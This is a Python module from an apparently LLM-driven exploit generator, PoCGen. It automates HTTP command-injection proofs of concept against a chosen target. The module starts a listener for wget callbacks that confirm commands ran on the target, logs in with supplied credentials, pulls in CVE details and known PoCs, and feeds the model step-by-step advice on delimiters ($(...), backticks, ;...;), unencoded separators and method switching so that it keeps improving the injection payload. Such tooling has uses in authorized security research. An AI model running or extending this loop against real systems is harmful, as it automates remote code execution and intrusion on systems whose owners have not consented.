from __future__ import annotations

from typing import List, Optional

from rich.console import Console

from PoCGen.config.config import SETTINGS
from PoCGen.llm.client import ChatMessage
from PoCGen.prompts.templates import build_prompt_command_injection_http
from PoCGen.core.attacker_monitor import (
    AttackerMonitor,
    get_monitor_base_url,
    monitor_available,
    reset_external_monitor,
    wait_for_external_monitor,
)
from PoCGen.core.vuln_analyzer import analyze_vulnerability
from PoCGen.core.models import HTTPMessage, ValidationResult
from PoCGen.core.shared.http_handler import HTTPHandlerBase, GenerationContext

console = Console()

_DELIMITER_ORDER = ["$()", "`...`", ";...;"]


class CommandInjectionHTTPHandler(HTTPHandlerBase):
    name = "command_injection_http"

    @property
    def file_prefix(self) -> str:
        return "poc"

    def build_prompt(
        self,
        description: str,
        code_texts: List[str],
        target: Optional[str],
        target_profile: Optional[str] = None,
        validation_feedback: Optional[str] = None,
        **kwargs,
    ) -> List[ChatMessage]:
        return build_prompt_command_injection_http(
            description=description,
            code_files=code_texts,
            target=target,
            payload=kwargs.get("payload", SETTINGS.payload),
            target_profile=target_profile,
            validation_feedback=validation_feedback,
            vuln_analysis=kwargs.get("vuln_analysis"),
            web_info=kwargs.get("web_info"),
        )

    def build_messages(self, description, code_texts, target, payload=None,
                       target_profile=None, validation_feedback=None,
                       vuln_analysis=None, web_info=None) -> List[dict]:
        msgs = build_prompt_command_injection_http(
            description=description,
            code_files=code_texts,
            target=target,
            payload=payload or SETTINGS.payload,
            target_profile=target_profile,
            validation_feedback=validation_feedback,
            vuln_analysis=vuln_analysis,
            web_info=web_info,
        )
        return [m.model_dump() for m in msgs]

    def detect_success(self, validation_results, requests, ctx):
        monitor_running = getattr(ctx, "_monitor_running", False)
        if not monitor_running or not requests:
            return False, None
        external_monitor_url = getattr(ctx, "_external_monitor_url", None)
        monitor = getattr(ctx, "_monitor", None)
        monitor_wait = SETTINGS.monitor_timeout
        if external_monitor_url:
            hit, summary = wait_for_external_monitor(
                external_monitor_url, monitor_wait, since_ts=ctx.generation_start_ts
            )
        elif monitor:
            hit = monitor.wait_for_hit(monitor_wait)
            summary = monitor.last_request_summary
        else:
            return False, None
        if hit:
            return True, summary or "Attacker monitor recorded a callback!"
        return False, None

    def build_feedback(self, parse_issues, validation_results, validation_error=None, **kwargs):
        return _build_attempt_feedback(
            parse_issues, validation_results,
            kwargs.get("payload", SETTINGS.payload),
            kwargs.get("monitor_active", False),
            validation_error,
        )

    def inject_cookies(self, requests, cookies_header):
        for req in requests:
            existing = req.headers.get("Cookie", "")
            if "Cookie" not in req.headers or "REPLACE_ME" in existing or not existing.strip():
                req.headers["Cookie"] = cookies_header

    def on_before_loop(self, ctx):
        # Attacker monitor setup
        monitor_wait = SETTINGS.monitor_timeout
        monitor_base_url = get_monitor_base_url()
        monitor = None
        external_monitor_url = None
        monitor_running = False

        if ctx.auto_validate:
            if monitor_available(monitor_base_url):
                external_monitor_url = monitor_base_url
                monitor_running = True
                console.print(f"[cyan]Reusing existing attacker monitor at {monitor_base_url}")
                reset_external_monitor(monitor_base_url)
            else:
                monitor = AttackerMonitor(monitor_base_url, timeout=monitor_wait)
                monitor.start()
                monitor_running = monitor.is_running()
                if monitor_running:
                    console.print(f"[green]Attacker monitor listening on {monitor_base_url}")
                else:
                    console.print("[yellow]Warning: attacker monitor failed to start")

        ctx._monitor = monitor
        ctx._external_monitor_url = external_monitor_url
        ctx._monitor_running = monitor_running

        # Vuln analysis
        binary_path = getattr(ctx, "_binary_path", None)
        if binary_path:
            console.print("[bold]Vulnerability analysis (source + binary)")
            try:
                vuln_result = analyze_vulnerability(
                    description=ctx.description,
                    code_texts=ctx.code_texts,
                    cvenumber=ctx.cvenumber,
                    binary_path=binary_path,
                )
                if vuln_result.is_valid:
                    ctx._vuln_analysis_block = vuln_result.as_prompt_block
                else:
                    ctx._vuln_analysis_block = vuln_result.raw_output[:3000]
            except Exception as exc:
                console.print(f"[yellow]Vulnerability analysis failed: {exc}")
                ctx._vuln_analysis_block = None

        return monitor

    def on_cleanup(self, resource):
        if resource:
            resource.stop()

    def generate(self, description, code_texts, target=None, vuln_type=None,
                 temperature=None, max_tokens=None, payload=None, attacker_url=None,
                 probe_target=False, auto_validate=False, max_iterations=None,
                 stop_on_success=None, monitor_timeout=None, cvenumber=None,
                 login_url=None, login_username=None, login_password=None,
                 login_user_field="username", login_pass_field="password",
                 use_browser_login=False, browser_headless=None,
                 binary_path=None, **kwargs):
        # Store binary_path for on_before_loop
        ctx_proxy = type("_", (), {"_binary_path": binary_path})()
        # Monkey-patch: we'll pass binary_path via the context
        original_on_before = self.on_before_loop

        def patched_on_before(ctx):
            ctx._binary_path = binary_path
            ctx._vuln_analysis_block = None
            ctx._web_info_block = None
            # CVE web info
            if cvenumber:
                from PoCGen.core.cve_crawler import get_web_infomation
                web_data = get_web_infomation(cvenumber)
                if web_data:
                    parts = []
                    if web_data.get("info"):
                        parts.append(f"Vulnerability Summary: {web_data['info']}")
                    if web_data.get("reason"):
                        parts.append(f"Root Cause: {web_data['reason']}")
                    if web_data.get("webpoc"):
                        parts.append(f"Known PoC:\n{web_data['webpoc']}")
                    ctx._web_info_block = "\n\n".join(parts)
            result = original_on_before(ctx)
            return result

        self.on_before_loop = patched_on_before

        # Override build_messages to pass extra context
        original_build = self.build_messages

        def patched_build(desc, code, tgt, pay=None, tp=None, vf=None, va=None, wi=None):
            return original_build(desc, code, tgt, pay or payload or SETTINGS.payload,
                                  tp, vf, va, wi)

        self.build_messages = patched_build

        try:
            result = super().generate(
                description=description, code_texts=code_texts, target=target,
                vuln_type=vuln_type, temperature=temperature or SETTINGS.temperature,
                max_tokens=max_tokens or SETTINGS.max_tokens,
                payload=payload or SETTINGS.payload,
                probe_target=probe_target, auto_validate=auto_validate,
                max_iterations=max_iterations, stop_on_success=stop_on_success,
                cvenumber=None,  # already handled
                login_url=login_url, login_username=login_username,
                login_password=login_password, login_user_field=login_user_field,
                login_pass_field=login_pass_field, use_browser_login=use_browser_login,
                browser_headless=browser_headless,
            )
            return result
        finally:
            self.on_before_loop = original_on_before
            self.build_messages = original_build


def _build_attempt_feedback(
    parse_issues: List[str],
    validation_results: Optional[List[ValidationResult]],
    payload: str,
    monitor_active: bool,
    validation_error: Optional[str] = None,
) -> Optional[str]:
    messages: List[str] = []
    if parse_issues:
        bullet = "\n".join(f"- {issue}" for issue in parse_issues)
        messages.append("Local HTTP parsing/validation issues detected:\n" + bullet)

    validation_summaries: List[str] = []
    failed_validation: List[ValidationResult] = []
    if validation_results is not None:
        for res in validation_results:
            status = f"HTTP {res.status_code}" if res.status_code is not None else "no status"
            url = res.url or "<no url>"
            preview = (res.response_preview or "").strip()
            if preview:
                preview = preview[:200] + ("..." if len(preview) > 200 else "")
            detail_parts: List[str] = []
            if res.error:
                detail_parts.append(res.error)
            if preview:
                detail_parts.append(f"body: {preview}")
            detail = "; ".join(detail_parts)

            if res.success:
                line = f"Request #{res.request_index}: success -> {status} ({url})"
            else:
                failed_validation.append(res)
                line = f"Request #{res.request_index}: failure -> {status} ({url})"
                if not detail:
                    detail = "no response"
            if detail:
                line += f"; {detail}"
            validation_summaries.append(line)

        if validation_summaries:
            messages.append("Target validation summary:\n" + "\n".join(f"- {item}" for item in validation_summaries))
    elif validation_error:
        messages.append(f"Target validation did not run due to error: {validation_error}")
    else:
        messages.append("Target validation did not run or returned no results.")

    if monitor_active:
        messages.append(
            "Attacker monitor did NOT receive the expected wget callback. Ensure the payload executes wget "
            f"{payload} directly (no URL encoding of separators) and that the vulnerable parameter maps to command execution."
        )
    else:
        messages.append(
            "Attacker monitor is unavailable, so success could not be confirmed automatically. Still refine the payload to trigger wget "
            f"{payload} if possible."
        )

    if parse_issues or failed_validation:
        messages.append(
            "Adjust along four tracks before the next attempt:\n"
            "1) Encoding: rebuild the BODY to mirror required fields, parameter casing/order, and payload syntax; match the server's expected encoding (JSON vs form-urlencoded vs raw) and reuse its injection delimiters (e.g., '$(...)', '$(+ ...)', backticks, pipes).\n"
            "2) Status/redirects: if 301/302, retry with the redirected path (e.g., '/path' -> '/path/'); if 401/403, refresh Cookie/credentials or follow the hinted auth flow; align Host/Origin/Referer with the target.\n"
            "3) Method: if a POST with empty body fails, resend the same request as GET to handle endpoints that only read query params.\n"
            "4) Payload: use a minimal, paired delimiter around the payload (e.g., ';{payload};'), avoid extra quotes/backticks/brackets unless already present, and do NOT URL-encode separators; escape only what JSON requires."
        )

    return "\n\n".join(messages) if messages else None


# Legacy wrapper for generator.py compatibility
def generate_command_injection_http(**kwargs) -> "GenerationResult":
    handler = CommandInjectionHTTPHandler()
    return handler.generate(**kwargs)
